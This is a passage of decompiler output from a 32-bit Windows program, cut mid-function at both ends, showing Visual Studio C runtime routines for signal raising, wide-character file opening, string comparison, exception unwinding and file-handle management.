  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"IsProcessorFeaturePresent");
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(0);
      return;
    }
  }
  __ms_p5_test_fdiv();
  return;
}



// Library Function - Single Match
//  __initp_misc_winsig
// 
// Library: Visual Studio 2008 Release

void __cdecl __initp_misc_winsig(undefined4 param_1)

{
  DAT_004369e0 = param_1;
  DAT_004369e4 = param_1;
  DAT_004369e8 = param_1;
  DAT_004369ec = param_1;
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2008 Release

uint __fastcall _siglookup(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_004339ac * 0xc + param_3);
  if ((DAT_004339ac * 0xc + param_3 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_sigabrt
// 
// Library: Visual Studio 2008 Release

_PHNDLR __cdecl ___get_sigabrt(void)

{
  _PHNDLR p_Var1;
  
  p_Var1 = (_PHNDLR)__decode_pointer(DAT_004369e8);
  return p_Var1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2008 Release

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  code *pcVar3;
  int iVar4;
  code *pcVar5;
  undefined4 extraout_ECX;
  code **ppcVar6;
  _ptiddata p_Var7;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var7 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        ppcVar6 = (code **)&DAT_004369e0;
        iVar4 = DAT_004369e0;
        goto LAB_004224d2;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_004224b0;
        if (_SigNum != 8) goto LAB_00422494;
      }
    }
    p_Var7 = __getptd_noexit();
    if (p_Var7 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = _siglookup(extraout_ECX,_SigNum,(uint)p_Var7->_pxcptacttab);
    ppcVar6 = (code **)(uVar1 + 8);
    pcVar3 = *ppcVar6;
  }
  else {
    if (_SigNum == 0xf) {
      ppcVar6 = (code **)&DAT_004369ec;
      iVar4 = DAT_004369ec;
    }
    else if (_SigNum == 0x15) {
      ppcVar6 = (code **)&DAT_004369e4;
      iVar4 = DAT_004369e4;
    }
    else {
      if (_SigNum != 0x16) {
LAB_00422494:
        piVar2 = __errno();
        *piVar2 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return -1;
      }
LAB_004224b0:
      ppcVar6 = (code **)&DAT_004369e8;
      iVar4 = DAT_004369e8;
    }
LAB_004224d2:
    local_20 = 1;
    pcVar3 = (code *)__decode_pointer(iVar4);
  }
  iVar4 = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    iVar4 = __exit(3);
  }
  if (local_20 != iVar4) {
    __lock(iVar4);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var7->_tpxcptinfoptrs;
    p_Var7->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var7->_tfpecode;
      p_Var7->_tfpecode = 0x8c;
      goto LAB_00422536;
    }
  }
  else {
LAB_00422536:
    if (_SigNum == 8) {
      for (local_28 = DAT_004339a0; local_28 < DAT_004339a4 + DAT_004339a0; local_28 = local_28 + 1)
      {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var7->_pxcptacttab) = 0;
      }
      goto LAB_00422570;
    }
  }
  pcVar5 = (code *)__encoded_null();
  *ppcVar6 = pcVar5;
LAB_00422570:
  FUN_00422591();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var7->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var7->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var7->_tfpecode = local_34;
  }
  return 0;
}



void FUN_00422591(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_0041be7c(0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_004225cd(undefined4 param_1)

{
  _DAT_004369f4 = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_004225dc(undefined4 param_1)

{
  _DAT_004369f8 = param_1;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___crtInitCritSecAndSpinCount
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl ___crtInitCritSecAndSpinCount(LPCRITICAL_SECTION param_1,DWORD param_2)

{
  BOOL BVar1;
  
  BVar1 = InitializeCriticalSectionAndSpinCount(param_1,param_2);
  return BVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00422702(void)

{
  _DAT_00437d48 = 0;
  return;
}



// Library Function - Single Match
//  __tsopen_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl
__tsopen_nolock(undefined4 *param_1,LPCWSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint *in_EAX;
  errno_t eVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  DWORD DVar7;
  long lVar8;
  int iVar9;
  HANDLE pvVar10;
  byte bVar11;
  int unaff_EDI;
  int iVar12;
  bool bVar13;
  longlong lVar14;
  _SECURITY_ATTRIBUTES local_38;
  undefined4 local_28;
  uint local_24;
  HANDLE local_20;
  uint local_1c;
  DWORD local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar13 = (param_3 & 0x80) == 0;
  local_24 = 0;
  local_6 = 0;
  local_38.nLength = 0xc;
  local_38.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar13) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_38.bInheritHandle = (BOOL)bVar13;
  eVar3 = __get_fmode((int *)&local_24);
  if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_24 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_c = 0x80000000;
  }
  else {
    if (uVar4 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_c = 0x40000000;
        goto LAB_00422876;
      }
    }
    else if (uVar4 != 2) goto LAB_00422832;
    local_c = 0xc0000000;
  }
LAB_00422876:
  if (param_4 == 0x10) {
    local_14 = 0;
  }
  else if (param_4 == 0x20) {
    local_14 = 1;
  }
  else if (param_4 == 0x30) {
    local_14 = 2;
  }
  else if (param_4 == 0x40) {
    local_14 = 3;
  }
  else {
    if (param_4 != 0x80) goto LAB_00422832;
    local_14 = (uint)(local_c == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_18 = 3;
    }
    else if (uVar4 == 0x100) {
      local_18 = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_0042297b;
      if (uVar4 != 0x300) goto LAB_00422832;
      local_18 = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_0042297b:
        local_18 = 5;
        goto LAB_0042292a;
      }
      if (uVar4 != 0x700) {
LAB_00422832:
        puVar5 = ___doserrno();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        piVar6 = __errno();
        *piVar6 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return 0x16;
      }
    }
    local_18 = 1;
  }
LAB_0042292a:
  local_10 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_00435f8c & param_5))) {
    local_10 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_10 = local_10 | 0x4000000;
    local_c = local_c | 0x10000;
    local_14 = local_14 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_10 = local_10 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_10 = local_10 | 0x10000000;
    }
  }
  else {
    local_10 = local_10 | 0x8000000;
  }
  uVar4 = __alloc_osfhnd();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    piVar6 = __errno();
    *piVar6 = 0x18;
    goto LAB_00422a43;
  }
  *param_1 = 1;
  local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
  if (local_20 == (HANDLE)0xffffffff) {
    if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_c = local_c & 0x7fffffff;
      local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
      if (local_20 != (HANDLE)0xffffffff) goto LAB_00422a4f;
    }
    pbVar1 = (byte *)((&DAT_00437d80)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    goto LAB_00422a43;
  }
LAB_00422a4f:
  DVar7 = GetFileType(local_20);
  if (DVar7 == 0) {
    pbVar1 = (byte *)((&DAT_00437d80)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    CloseHandle(local_20);
    if (DVar7 == 0) {
      piVar6 = __errno();
      *piVar6 = 0xd;
    }
    goto LAB_00422a43;
  }
  if (DVar7 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar7 == 3) {
    local_5 = local_5 | 8;
  }
  __set_osfhnd(*in_EAX,(intptr_t)local_20);
  bVar11 = local_5 | 1;
  *(byte *)((&DAT_00437d80)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar11;
  pbVar1 = (byte *)((&DAT_00437d80)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar2 = local_5 & 0x80;
    local_5 = bVar11;
    if (bVar2 == 0) goto LAB_00422dc4;
    if ((param_3 & 2) == 0) goto LAB_00422b8a;
    local_1c = __lseek_nolock(*in_EAX,-1,2);
    if (local_1c == 0xffffffff) {
      puVar5 = ___doserrno();
      bVar11 = local_5;
      if (*puVar5 == 0x83) goto LAB_00422b8a;
    }
    else {
      local_28 = 0;
      iVar12 = __read_nolock(*in_EAX,&local_28,1);
      if ((((iVar12 != 0) || ((short)local_28 != 0x1a)) ||
          (iVar12 = __chsize_nolock(*in_EAX,CONCAT44(unaff_EDI,(int)local_1c >> 0x1f)), iVar12 != -1
          )) && (lVar8 = __lseek_nolock(*in_EAX,0,0), bVar11 = local_5, lVar8 != -1))
      goto LAB_00422b8a;
    }
LAB_00422b3c:
    __close_nolock(*in_EAX);
    goto LAB_00422a43;
  }
LAB_00422b8a:
  local_5 = bVar11;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_24 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_24 & 0x74000;
      }
    }
    uVar4 = param_3 & 0x74000;
    if (uVar4 == 0x4000) {
      local_6 = 0;
    }
    else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
      if ((param_3 & 0x301) == 0x301) goto LAB_00422bf9;
    }
    else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_00422bf9:
      local_6 = 2;
    }
    else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
      local_6 = 1;
    }
    if (((param_3 & 0x70000) != 0) && (local_1c = 0, (local_5 & 0x40) == 0)) {
      uVar4 = local_c & 0xc0000000;
      if (uVar4 == 0x40000000) {
        if (local_18 == 0) goto LAB_00422dc4;
        if (2 < local_18) {
          if (local_18 < 5) {
            lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
            if (lVar14 == 0) goto LAB_00422c5e;
            lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
            uVar4 = (uint)lVar14 & (uint)((ulonglong)lVar14 >> 0x20);
            goto LAB_00422d2a;
          }
LAB_00422c55:
          if (local_18 != 5) goto LAB_00422dc4;
        }
LAB_00422c5e:
        iVar12 = 0;
        if (local_6 == 1) {
          local_1c = 0xbfbbef;
          local_18 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_00422dc4;
          local_1c = 0xfeff;
          local_18 = 2;
        }
        do {
          iVar9 = __write(*in_EAX,(void *)((int)&local_1c + iVar12),local_18 - iVar12);
          if (iVar9 == -1) goto LAB_00422b3c;
          iVar12 = iVar12 + iVar9;
        } while (iVar12 < (int)local_18);
      }
      else {
        if (uVar4 != 0x80000000) {
          if ((uVar4 == 0xc0000000) && (local_18 != 0)) {
            if (2 < local_18) {
              if (4 < local_18) goto LAB_00422c55;
              lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
              if (lVar14 != 0) {
                lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
                if (lVar14 == -1) goto LAB_00422b3c;
                goto LAB_00422caf;
              }
            }
            goto LAB_00422c5e;
          }
          goto LAB_00422dc4;
        }
LAB_00422caf:
        iVar12 = __read_nolock(*in_EAX,&local_1c,3);
        if (iVar12 == -1) goto LAB_00422b3c;
        if (iVar12 == 2) {
LAB_00422d38:
          if ((local_1c & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar6 = __errno();
            *piVar6 = 0x16;
            return 0x16;
          }
          if ((local_1c & 0xffff) == 0xfeff) {
            lVar8 = __lseek_nolock(*in_EAX,2,0);
            if (lVar8 == -1) goto LAB_00422b3c;
            local_6 = 2;
            goto LAB_00422dc4;
          }
        }
        else if (iVar12 == 3) {
          if (local_1c == 0xbfbbef) {
            local_6 = 1;
            goto LAB_00422dc4;
          }
          goto LAB_00422d38;
        }
        uVar4 = __lseek_nolock(*in_EAX,0,0);
LAB_00422d2a:
        if (uVar4 == 0xffffffff) goto LAB_00422b3c;
      }
    }
  }
LAB_00422dc4:
  uVar4 = local_c;
  pbVar1 = (byte *)((&DAT_00437d80)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_00437d80)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_00437d80)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
    CloseHandle(local_20);
    pvVar10 = CreateFileW(param_2,uVar4 & 0x7fffffff,local_14,&local_38,3,local_10,(HANDLE)0x0);
    if (pvVar10 == (HANDLE)0xffffffff) {
      DVar7 = GetLastError();
      __dosmaperr(DVar7);
      pbVar1 = (byte *)((&DAT_00437d80)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
      __free_osfhnd(*in_EAX);
LAB_00422a43:
      piVar6 = __errno();
      return *piVar6;
    }
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_00437d80)[(int)*in_EAX >> 5]) = pvVar10;
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wsopen_helper
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wsopen_helper(wchar_t *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_004306c0;
  uStack_c = 0x422ed5;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (wchar_t *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = __tsopen_nolock(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_00422f67();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_00422f67(void)

{
  byte *pbVar1;
  int unaff_EBP;
  int unaff_ESI;
  uint *unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_ESI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_ESI) {
      pbVar1 = (byte *)((&DAT_00437d80)[(int)*unaff_EDI >> 5] + 4 + (*unaff_EDI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_EDI);
  }
  return;
}



// Library Function - Single Match
//  __wsopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wsopen_s(int *_FileHandle,wchar_t *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionFlag)

{
  errno_t eVar1;
  
  eVar1 = __wsopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionFlag,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __wcsnicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsnicmp_l(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  wchar_t wVar1;
  wchar_t wVar2;
  wint_t wVar3;
  wint_t wVar4;
  int iVar5;
  int *piVar6;
  uint uVar7;
  uint uVar8;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  iVar5 = 0;
  if (_MaxCount != 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar6 = __errno();
      *piVar6 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      iVar5 = 0x7fffffff;
    }
    else {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        do {
          wVar1 = *_Str1;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          uVar8 = (uint)(ushort)wVar1;
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar7 = (uint)(ushort)wVar2;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
      }
      else {
        do {
          wVar3 = __towlower_l(*_Str1,&local_14);
          uVar8 = (uint)wVar3;
          wVar4 = __towlower_l(*_Str2,&local_14);
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar7 = (uint)wVar4;
          if ((_MaxCount == 0) || (wVar3 == 0)) break;
        } while (wVar3 == wVar4);
      }
      iVar5 = uVar8 - uVar7;
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  __wcsnicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsnicmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int iVar3;
  int *piVar4;
  
  if (DAT_00436790 == 0) {
    iVar3 = 0;
    if (_MaxCount != 0) {
      if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
        piVar4 = __errno();
        *piVar4 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        iVar3 = 0x7fffffff;
      }
      else {
        do {
          wVar1 = *_Str1;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
        iVar3 = (uint)(ushort)wVar1 - (uint)(ushort)wVar2;
      }
    }
  }
  else {
    iVar3 = __wcsnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  }
  return iVar3;
}



// Library Function - Single Match
//  _wcsncmp
// 
// Library: Visual Studio 2008 Release

int __cdecl _wcsncmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  if (_MaxCount != 0) {
    for (; ((_MaxCount = _MaxCount - 1, _MaxCount != 0 && (*_Str1 != L'\0')) && (*_Str1 == *_Str2));
        _Str1 = _Str1 + 1) {
      _Str2 = _Str2 + 1;
    }
    return (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
  }
  return 0;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x423194,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  void *local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_0042319c;
  local_20 = ExceptionList;
  ExceptionList = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_004232b0();
    }
  }
  ExceptionList = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify1
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

undefined4 __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00433b48 = param_1;
  DAT_00433b44 = in_EAX;
  DAT_00433b4c = unaff_EBP;
  return in_EAX;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00433b48 = param_1;
  DAT_00433b44 = in_EAX;
  DAT_00433b4c = unaff_EBP;
  return;
}



void FUN_004232b0(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_004362f8 = _DAT_004362f8 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0042332d:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_0042332d;
      }
    }
    pbVar1 = (byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int in_stack_ffffffc8;
  undefined8 local_28;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00437d68)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
        puVar1 = ___doserrno();
        *puVar1 = 0;
        piVar2 = __errno();
        *piVar2 = 9;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        local_28._4_4_ = 0xffffffff;
        local_28._0_4_ = 0xffffffff;
      }
      else {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_28 = -1;
        }
        else {
          local_28 = __lseeki64_nolock(_FileHandle,_Offset,in_stack_ffffffc8);
        }
        FUN_00423490();
      }
      goto LAB_0042348a;
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  local_28._0_4_ = 0xffffffff;
  local_28._4_4_ = 0xffffffff;
LAB_0042348a:
  return CONCAT44(local_28._4_4_,(undefined4)local_28);
}



void FUN_00423490(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __set_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_osfhnd(int param_1,intptr_t param_2)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00437d68)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    if (*(int *)(iVar3 + (&DAT_00437d80)[param_1 >> 5]) == -1) {
      if (DAT_00432c1c == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_004234f7;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)param_2);
      }
LAB_004234f7:
      *(intptr_t *)(iVar3 + (&DAT_00437d80)[param_1 >> 5]) = param_2;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __free_osfhnd(int param_1)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
